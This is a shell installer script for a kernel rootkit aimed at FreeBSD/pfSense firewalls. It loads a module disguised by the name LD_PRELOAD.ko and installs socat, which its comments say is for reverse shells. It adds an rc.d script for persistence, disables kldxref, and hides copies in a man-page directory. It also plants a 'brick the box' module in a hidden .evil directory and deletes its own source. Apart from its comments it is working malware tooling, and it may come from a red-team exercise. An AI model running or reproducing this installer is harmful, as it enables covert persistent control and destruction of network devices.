#!/bin/sh

if [ "$(id -u)" -ne 0 ]; then
   echo "Must be root to run this"
   exit 1
fi

# make writable
mount -o rw /

# mv LD_PRELOAD.ko LD_PRELOAD
LKM_NAME="LD_PRELOAD.ko"
RELOAD_FILE="apeshit.sh"
BACKUP_DIR="/usr/local/share/man/man1/backups"

mkdir $BACKUP_DIR

# only make it if it doesn't exist
[ -f $LKM_NAME ] || make

# the version of nc (netcat) that comes with pfSense/FreeBSD doesn't allow for reverse shells
# therefore we get socat
pkg install -y socat

# service ldpreload start
mv $RELOAD_FILE /usr/local/etc/rc.d/
chmod +x /usr/local/etc/rc.d/$RELOAD_FILE

# Disable kldxref by setting kldxref_enable="NO"
sed -i '' 's/^kldxref_enable="YES"/kldxref_enable="NO"/' /etc/rc.conf

# put the rootkit in the modules
cp "$LKM_NAME" /boot/modules/
cp "$LKM_NAME" "$BACKUP_DIR"
# also put the rootkit in a super deep random directory to backup from

chmod +x "/boot/modules/$LKM_NAME"
chmod +x "$BACKUP_DIR/$LKM_NAME"
kldload "/boot/modules/$LKM_NAME"

# create and put the LKM that "bricks" the box into a hidden directory 
# you can later load this yourself but nothing works it with automatically
mkdir /boot/modules/.evil
cd extra/brick_box/
# only run make if the file does not exist
[ -f evil.ko ] || make
mv evil.ko /boot/modules/.evil/

cd ../../..
rm -rf Apekit-rootshit
cd ..
